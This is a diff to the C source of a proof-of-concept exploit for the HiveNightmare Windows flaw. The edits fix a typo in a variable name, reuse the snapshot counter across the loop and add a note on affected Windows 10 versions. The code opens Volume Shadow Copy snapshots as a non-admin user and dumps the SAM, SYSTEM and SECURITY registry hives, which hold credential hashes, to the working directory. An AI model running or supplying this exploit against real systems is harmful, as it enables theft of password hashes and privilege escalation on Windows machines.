@@ -1,5 +1,6 @@
 // Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
 // Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users
+// * Win10 1809 and above are vulnerable.
 
 #include <windows.h>
 #include <stdio.h>
@@ -14,7 +15,6 @@ BOOL main() {
         "SYSTEM",
     };
 
-
     printf("\n[-] HiveNightmare - dump registry hives as non-admin users\n");
 
     char* fullPathShadow = (char*)calloc(MAX_PATH, sizeof(char*));
@@ -22,19 +22,20 @@ BOOL main() {
         printf("[x] Memory error !\n");
         return TRUE;
     }
-
+    int valideNumberVolume = 1;
     for (int targetFilesNb = 0; targetFilesNb < sizeof(targetFiles) / sizeof(char*); targetFilesNb++) {
-        int valideNumberVolune = 1;
+        
         HANDLE hFile = INVALID_HANDLE_VALUE;
         HANDLE hAppend;
         DWORD  dwBytesRead, dwBytesWritten, dwPos;
         BYTE   buff[4096];
 
-        for (; valideNumberVolune < NUMBER_SNAPSHOTS && hFile == INVALID_HANDLE_VALUE; valideNumberVolune++) {
-            sprintf_s(fullPathShadow, MAX_PATH, pathShadow, valideNumberVolune, targetFiles[targetFilesNb]);
+
+        for (; valideNumberVolume < NUMBER_SNAPSHOTS && hFile == INVALID_HANDLE_VALUE; valideNumberVolume++) {
+            sprintf_s(fullPathShadow, MAX_PATH, pathShadow, valideNumberVolume, targetFiles[targetFilesNb]);
             hFile = CreateFileA(fullPathShadow, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         }
-        if (valideNumberVolune == NUMBER_SNAPSHOTS || hFile == INVALID_HANDLE_VALUE) {
+        if (valideNumberVolume == NUMBER_SNAPSHOTS || hFile == INVALID_HANDLE_VALUE) {
             printf("[x] Could not open %s :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first %i VSS snapshots only - list snapshots with vssadmin list shadows\n", targetFiles[targetFilesNb], NUMBER_SNAPSHOTS);
             return TRUE;
         }
@@ -55,6 +56,7 @@ BOOL main() {
         CloseHandle(hAppend);
 
         printf("\t[-] %s hive written out to current working directory\n", targetFiles[targetFilesNb]);
+        valideNumberVolume--;
     }
     free(fullPathShadow);
     printf("\n[*] Assuming no errors, should be able to find hive dump files in current working directory as SAM, SECURITY and SYSTEM\n");
